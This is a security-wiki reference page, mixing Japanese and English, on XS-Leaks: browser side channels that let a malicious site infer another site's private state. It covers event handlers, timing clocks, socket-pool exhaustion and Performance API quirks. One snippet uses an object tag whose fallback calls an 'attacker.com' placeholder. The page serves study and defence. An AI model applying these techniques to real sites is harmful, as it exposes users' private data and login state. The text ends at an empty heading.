# XS-Search/XS-Leaks

{{#include ../banners/hacktricks-training.md}}

## 基本情報

XS-Searchは、**サイドチャネル脆弱性**を利用して**クロスオリジン情報を抽出する**ための手法です。

この攻撃に関与する主要なコンポーネントは以下の通りです：

- **脆弱なウェブ**: 情報を抽出することを目的としたターゲットウェブサイト。
- **攻撃者のウェブ**: 攻撃者が作成した悪意のあるウェブサイトで、被害者が訪れ、エクスプロイトをホストしています。
- **インクルージョンメソッド**: 脆弱なウェブを攻撃者のウェブに組み込むために使用される技術（例：window.open、iframe、fetch、hrefを持つHTMLタグなど）。
- **リーク技術**: インクルージョンメソッドを通じて収集された情報に基づいて、脆弱なウェブの状態の違いを識別するために使用される技術。
- **状態**: 攻撃者が区別しようとする脆弱なウェブの2つの潜在的な条件。
- **検出可能な違い**: 攻撃者が脆弱なウェブの状態を推測するために依存する観察可能な変化。

### 検出可能な違い

脆弱なウェブの状態を区別するために分析できるいくつかの側面があります：

- **ステータスコード**: サーバーエラー、クライアントエラー、または認証エラーなど、**さまざまなHTTPレスポンスステータスコード**をクロスオリジンで区別します。
- **API使用**: ページ間での**Web APIの使用**を特定し、クロスオリジンページが特定のJavaScript Web APIを使用しているかどうかを明らかにします。
- **リダイレクト**: HTTPリダイレクトだけでなく、JavaScriptやHTMLによってトリガーされる異なるページへのナビゲーションを検出します。
- **ページコンテンツ**: **HTTPレスポンスボディ**やページのサブリソースにおける変化を観察し、**埋め込まれたフレームの数**や画像のサイズの違いなどを確認します。
- **HTTPヘッダー**: **特定のHTTPレスポンスヘッダー**の存在またはその値に注意を払い、X-Frame-Options、Content-Disposition、Cross-Origin-Resource-Policyなどのヘッダーを含みます。
- **タイミング**: 2つの状態間の一貫した時間の違いに気づきます。

### インクルージョンメソッド

- **HTML要素**: HTMLは、スタイルシート、画像、スクリプトなど、**クロスオリジンリソースのインクルージョン**のためのさまざまな要素を提供し、ブラウザに非HTMLリソースを要求させます。この目的のための潜在的なHTML要素のコンパイルは[https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)で見つけることができます。
- **フレーム**: **iframe**、**object**、および**embed**などの要素は、攻撃者のページにHTMLリソースを直接埋め込むことができます。ページが**フレーミング保護を欠いている**場合、JavaScriptはcontentWindowプロパティを介してフレーム化されたリソースのウィンドウオブジェクトにアクセスできます。
- **ポップアップ**: **`window.open`**メソッドは、新しいタブまたはウィンドウでリソースを開き、JavaScriptがSOPに従ってメソッドやプロパティと対話するための**ウィンドウハンドル**を提供します。ポップアップは、シングルサインオンでよく使用され、ターゲットリソースのフレーミングおよびクッキー制限を回避します。ただし、現代のブラウザは特定のユーザーアクションに制限してポップアップの作成を制限しています。
- **JavaScriptリクエスト**: JavaScriptは、**XMLHttpRequests**や**Fetch API**を使用してターゲットリソースへの直接リクエストを許可します。これらのメソッドは、HTTPリダイレクトに従うかどうかを選択するなど、リクエストに対する正確な制御を提供します。

### リーク技術

- **イベントハンドラー**: XS-Leaksにおける古典的なリーク技術で、**onload**や**onerror**のようなイベントハンドラーがリソースの読み込みの成功または失敗に関する洞察を提供します。
- **エラーメッセージ**: JavaScriptの例外や特別なエラーページは、エラーメッセージから直接リーク情報を提供するか、その存在と不在を区別することによってリーク情報を提供できます。
- **グローバル制限**: メモリ容量や他の強制されたブラウザ制限など、ブラウザの物理的制限は、しきい値に達したときに信号を送ることができ、リーク技術として機能します。
- **グローバル状態**: ブラウザの**グローバル状態**（例：履歴インターフェース）との検出可能な相互作用を悪用できます。たとえば、ブラウザの履歴内の**エントリの数**は、クロスオリジンページに関する手がかりを提供できます。
- **パフォーマンスAPI**: このAPIは、**現在のページのパフォーマンス詳細**を提供し、ドキュメントと読み込まれたリソースのネットワークタイミングを含み、要求されたリソースに関する推測を可能にします。
- **読み取り可能な属性**: 一部のHTML属性は**クロスオリジンで読み取り可能**であり、リーク技術として使用できます。たとえば、`window.frame.length`プロパティは、JavaScriptがクロスオリジンのウェブページに含まれるフレームの数をカウントすることを可能にします。

## XSinatorツールと論文

XSinatorは、いくつかの既知のXS-Leaksに対してブラウザを**チェックする**自動ツールであり、その論文で説明されています：[**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

ツールには[**https://xsinator.com/**](https://xsinator.com/)で**アクセスできます**。

> [!WARNING]
> **除外されたXS-Leaks**: 他のリークに干渉するため、**サービスワーカー**に依存するXS-Leaksを除外する必要がありました。さらに、特定のウェブアプリケーションの誤設定やバグに依存するXS-Leaksも**除外することにしました**。たとえば、CrossOrigin Resource Sharing (CORS)の誤設定、postMessageリーク、またはクロスサイトスクリプティングです。さらに、遅く、騒がしく、不正確であることが多いため、時間ベースのXS-Leaksも除外しました。

## **タイミングベースの技術**

以下のいくつかの技術は、ウェブページの可能な状態の違いを検出するプロセスの一部としてタイミングを使用します。ウェブブラウザで時間を測定する方法はいくつかあります。

**時計**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) APIは、開発者が高解像度のタイミング測定を取得することを可能にします。\
攻撃者が暗黙の時計を作成するために悪用できるAPIは多数あります：[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)、[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)、[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)、[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)、CSSアニメーションなど。\
詳細については、[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/)を参照してください。

## イベントハンドラ技術

### Onload/Onerror

- **インクルージョンメソッド**: フレーム、HTML要素
- **検出可能な違い**: ステータスコード
- **詳細情報**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)、[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **要約**: リソースを読み込もうとすると、onerror/onloadイベントがトリガーされ、リソースが成功裏に/失敗して読み込まれたかどうかを判断することができます。
- **コード例**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

コード例は、**JSからスクリプトオブジェクトを読み込もうとしますが、他のタグ**（オブジェクト、スタイルシート、画像、オーディオなど）も使用できます。さらに、**タグを直接**挿入し、タグ内に`onload`および`onerror`イベントを宣言することも可能です（JSから挿入するのではなく）。

この攻撃には、スクリプトなしのバージョンもあります：
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
この場合、`example.com/404` が見つからない場合、`attacker.com/?error` が読み込まれます。

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (一般的にページコンテンツ、ステータスコードによる)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** を使用して、リクエストを実行するのにかかる時間を測定できます。ただし、他の時計も使用できます。たとえば、[**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) は、50ms以上実行されているタスクを特定できます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) 別の例は次の通りです：

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

この技術は前のものと似ていますが、**attacker** は **positive または negative の回答の際に関連する時間をかける** アクションを **強制** し、その時間を測定します。

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (一般的にページコンテンツ、ステータスコードによる)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) を使用して、リクエストを実行するのにかかる時間を測定できます。他の時計も使用できます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

リソースを取得するのにかかる時間は、[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) および [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) イベントを利用して測定できます。**`beforeunload`** イベントは、ブラウザが新しいページに移動しようとしているときに発生し、**`unload`** イベントは、実際にナビゲーションが行われているときに発生します。これら2つのイベント間の時間差を計算することで、**ブラウザがリソースを取得するのにかかった時間** を特定できます。

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (一般的にページコンテンツ、ステータスコードによる)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API を使用して、リクエストを実行するのにかかる時間を測定できます。他の時計も使用できます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) がない場合、ページとそのサブリソースがネットワーク経由で読み込まれるのにかかる時間を攻撃者が測定できることが観察されています。この測定は、iframe の `onload` ハンドラーがリソースの読み込みと JavaScript の実行が完了した後にのみトリガーされるため、通常可能です。スクリプト実行によって導入される変動を回避するために、攻撃者は `<iframe>` 内で [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) 属性を使用することがあります。この属性を含めることで、多くの機能が制限され、特に JavaScript の実行が制限されるため、ネットワークパフォーマンスに主に影響される測定が容易になります。
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary**: 正しいコンテンツにアクセスしたときにページエラーを発生させ、任意のコンテンツにアクセスしたときに正しく読み込むことができれば、時間を測定することなくすべての情報を抽出するループを作成できます。
- **Code Example**:

Suppose that you can **insert** the **page** that has the **secret** content **inside an Iframe**.

You can **make the victim search** for the file that contains "_**flag**_" using an **Iframe** (exploiting a CSRF for example). Inside the Iframe you know that the _**onload event**_ will be **executed always at least once**. Then, you can **change** the **URL** of the **iframe** but changing only the **content** of the **hash** inside the URL.

For example:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

If the first URL was **successfully loaded**, then, when **changing** the **hash** part of the URL the **onload** event **won't be triggered** again. But **if** the page had some kind of **error** when **loading**, then, the **onload** event will be **triggered again**.

Then, you can **distinguish between** a **correctly** loaded page or page that has an **error** when is accessed.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary:** ページが**機密**コンテンツを**返す**、またはユーザーによって**制御**可能な**コンテンツ**を返す場合。ユーザーは**負のケース**で**有効なJSコードを設定**し、各試行を**`<script>`**タグ内で**読み込む**ことができます。したがって、**負の**ケースでは攻撃者の**コード**が**実行され**、**肯定的**なケースでは**何も**実行されません。
- **Code Example:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code & Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)**は、攻撃から保護するために特定の機密クロスオリジンリソースの読み込みを防ぐセキュリティ対策です。しかし、攻撃者はその保護動作を悪用できます。**CORB**の対象となる応答が`Content-Type`に`nosniff`を持ち、`2xx`ステータスコードを返すと、**CORB**は応答の本文とヘッダーを削除します。これを観察する攻撃者は、**ステータスコード**（成功またはエラーを示す）と`Content-Type`（**CORB**によって保護されているかどうかを示す）の組み合わせを推測し、潜在的な情報漏洩につながります。
- **Code Example**:

Check the more information link for more information about the attack.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: idまたはname属性から機密データを漏洩させます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

It's possible to **load a page** inside an **iframe** and use the **`#id_value`** to make the page **focus on the element** of the iframe with indicated if, then if an **`onblur`** signal is triggered, the ID element exists.\
You can perform the same attack with **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: postMessageから機密情報を収集するか、postMessagesの存在をオラクルとして使用してページ内のユーザーのステータスを知る
- **Code Example**: `Any code listening for all postMessages.`

Applications frequently utilize [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate across different origins. However, this method can inadvertently expose **sensitive information** if the `targetOrigin` parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving a message can act as an **oracle**; for instance, certain messages might only be sent to users who are logged in. Therefore, the presence or absence of these messages can reveal information about the user's state or identity, such as whether they are authenticated or not.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: WebSocket接続制限を使い果たすことで、クロスオリジンページのWebSocket接続数が漏洩します。
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

It is possible to identify if, and how many, **WebSocket connections a target page uses**. It allows an attacker to detect application states and leak information tied to the number of WebSocket connections.

If one **origin** uses the **maximum amount of WebSocket** connection objects, regardless of their connections state, the creation of **new objects will result in JavaScript exceptions**. To execute this attack, the attacker website opens the target website in a pop-up or iframe and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible. The **number of thrown exceptions** is the **number of WebSocket connections used by the target website** window.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: 支払いリクエストを検出します。なぜなら、同時にアクティブにできるのは1つだけだからです。
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

This XS-Leak enables an attacker to **detect when a cross-origin page initiates a payment request**.

Because **only one request payment can be active** at the same time, if the target website is using the Payment Request API, any f**urther attempts to show use this API will fail**, and cause a **JavaScript exception**. The attacker can exploit this by **periodically attempting to show the Payment API UI**. If one attempt causes an exception, the target website is currently using it. The attacker can hide these periodical attempts by immediately closing the UI after creation.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** シングルスレッドのJSイベントループを悪用して、ウェブの実行時間を測定します。
- **Code Example**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript operates on a [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) concurrency model, signifying that **it can only execute one task at a time**. This characteristic can be exploited to gauge **how long code from a different origin takes to execute**. An attacker can measure the execution time of their own code in the event loop by continuously dispatching events with fixed properties. These events will be processed when the event pool is empty. If other origins are also dispatching events to the same pool, an **attacker can infer the time it takes for these external events to execute by observing delays in the execution of their own tasks**. This method of monitoring the event loop for delays can reveal the execution time of code from different origins, potentially exposing sensitive information.

> [!WARNING]
> In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** ウェブ操作の実行時間を測定する方法の1つは、スレッドのイベントループを意図的にブロックし、**イベントループが再び利用可能になるまでの時間を測定する**ことです。ブロッキング操作（長い計算や同期API呼び出しなど）をイベントループに挿入し、その後のコードが実行を開始するまでの時間を監視することで、ブロッキング期間中にイベントループで実行されていたタスクの期間を推測できます。この技術は、タスクが順次実行されるJavaScriptのシングルスレッドの性質を利用しており、同じスレッドを共有する他の操作のパフォーマンスや動作に関する洞察を提供できます。
- **Code Example**:

A significant advantage of the technique of measuring execution time by locking the event loop is its potential to circumvent **Site Isolation**. **Site Isolation** is a security feature that separates different websites into separate processes, aiming to prevent malicious sites from directly accessing sensitive data from other sites. However, by influencing the execution timing of another origin through the shared event loop, an attacker can indirectly extract information about that origin's activities. This method does not rely on direct access to the other origin's data but rather observes the impact of that origin's activities on the shared event loop, thus evading the protective barriers established by **Site Isolation**.

> [!WARNING]
> In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** 攻撃者はすべてのソケットを1つを除いてロックし、ターゲットウェブを読み込み、同時に別のページを読み込むことができ、最後のページが読み込みを開始するまでの時間がターゲットページの読み込みにかかった時間です。
- **Code Example**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Browsers utilize sockets for server communication, but due to the limited resources of the operating system and hardware, **browsers are compelled to impose a limit** on the number of concurrent sockets. Attackers can exploit this limitation through the following steps:

1. Ascertain the browser's socket limit, for instance, 256 global sockets.
2. Occupy 255 sockets for an extended duration by initiating 255 requests to various hosts, designed to keep the connections open without completing.
3. Employ the 256th socket to send a request to the target page.
4. Attempt a 257th request to a different host. Given that all sockets are in use (as per steps 2 and 3), this request will be queued until a socket becomes available. The delay before this request proceeds provides the attacker with timing information about the network activity related to the 256th socket (the target page's socket). This inference is possible because the 255 sockets from step 2 are still engaged, implying that any newly available socket must be the one released from step 3. The time taken for the 256th socket to become available is thus directly linked to the time required for the request to the target page to complete.

For more info: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**:
- **Summary:** 前の技術と似ていますが、すべてのソケットを使用するのではなく、Google **Chrome**は**同じオリジンに対して6つの同時リクエストの制限**を設けています。もし**5つをブロック**し、次に**6つ目の**リクエストを**発信**すれば、**時間**を測定でき、**被害者ページが**同じエンドポイントに**リクエストを送信**させることができれば、**6つ目のリクエスト**は**長く**かかり、それを検出できます。

## Performance API Techniques

The [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offers insights into the performance metrics of web applications, further enriched by the [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). The Resource Timing API enables the monitoring of detailed network request timings, such as the duration of the requests. Notably, when servers include the `Timing-Allow-Origin: *` header in their responses, additional data like the transfer size and domain lookup time becomes available.

This wealth of data can be retrieved via methods like [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) or [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), providing a comprehensive view of performance-related information. Additionally, the API facilitates the measurement of execution times by calculating the difference between timestamps obtained from [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). However, it's worth noting that for certain operations in browsers like Chrome, the precision of `performance.now()` may be limited to milliseconds, which could affect the granularity of timing measurements.

Beyond timing measurements, the Performance API can be leveraged for security-related insights. For instance, the presence or absence of pages in the `performance` object in Chrome can indicate the application of `X-Frame-Options`. Specifically, if a page is blocked from rendering in a frame due to `X-Frame-Options`, it will not be recorded in the `performance` object, providing a subtle clue about the page's framing policies.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** エラーが発生したリクエストはリソースタイミングエントリを作成しません。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

It is possible to **differentiate between HTTP response status codes** because requests that lead to an **error** do **not create a performance entry**.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** ブラウザのバグにより、エラーが発生したリクエストは2回読み込まれます。
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In the previous technique it was also identified two cases where browser bugs in GC lead to **resources being loaded twice when they fail to load**. This will result in multiple entries in the Performance API and can thus be detected.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** エラーが発生したリクエストはマージできません。
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

The technique was found in a table in the mentioned paper but no description of the technique was found on it. However, you can find the source code checking for it in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** 空のレスポンスはリソースタイミングエントリを作成しません。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

An attacker can detect if a request resulted in an empty HTTP response body because e**mpty pages do not create a performance entry in some browsers**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** セキュリティアサーションでXSS監査機能を使用することで、攻撃者は特定のウェブページ要素を検出できます。これは、作成したペイロードが監査機能のフィルタリングメカニズムをトリガーしたときに応答の変化を観察することによって行われます。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Security Assertions (SA), the XSS Auditor, originally intended to prevent Cross-Site Scripting (XSS) attacks, can paradoxically be exploited to leak sensitive information. Although this built-in feature was removed from Google Chrome (GC), it's still present in SA. In 2013, Braun and Heiderich demonstrated that the XSS Auditor could inadvertently block legitimate scripts, leading to false positives. Building on this, researchers developed techniques to extract information and detect specific content on cross-origin pages, a concept known as XS-Leaks, initially reported by Terada and elaborated by Heyes in a blog post. Although these techniques were specific to the XSS Auditor in GC, it was discovered that in SA, pages blocked by the XSS Auditor do not generate entries in the Performance API, revealing a method through which sensitive information might still be leaked.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** X-Frame-Optionsヘッダーを持つリソースはリソースタイミングエントリを作成しません。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

If a page is **not allowed** to be **rendered** in an **iframe** it does **not create a performance entry**. As a result, an attacker can detect the response header **`X-Frame-Options`**.\
Same happens if you use an **embed** **tag.**

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** ダウンロードはPerformance APIにリソースタイミングエントリを作成しません。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar, to the XS-Leak described, a **resource that is downloaded** because of the ContentDisposition header, also does **not create a performance entry**. This technique works in all major browsers.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** リソースタイミングエントリはリダイレクトの開始時間を漏洩します。
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

We found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However, in **SA** it is possible to detect if the user is **redirected** by the target page, by querying the **Performance API** and checking for the **redirectStart timing data**.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** リダイレクトが発生した場合、タイミングエントリの持続時間は負になります。
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC, the **duration** for requests that result in a **redirect** is **negative** and can thus be **distinguished** from requests that do not result in a redirect.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** CORPで保護されたリソースはリソースタイミングエントリを作成しません。
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In some cases, the **nextHopProtocol entry** can be used as a leak technique. In GC, when the **CORP header** is set, the nextHopProtocol will be **empty**. Note that SA will not create a performance entry at all for CORP-enabled resources.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Usage
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** 特定のオリジンに対してサービスワーカーが登録されているかどうかを検出します。
- **Code Example**:

Service workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and **cache resources** to create offline web application.\
If a **resource cached** by a **service worker** is accessed via **iframe**, the resource will be **loaded from the service worker cache**.\
To detect if the resource was **loaded from the service worker** cache the **Performance API** can be used.\
This could also be done with a Timing attack (check the paper for more info).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** リソースがキャッシュに保存されているかどうかを確認できます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Using the [Performance API](xs-search.md#performance-api) it's possible to check if a resource is cached.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** `performance` APIからリクエストのネットワーク持続時間を取得できます。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

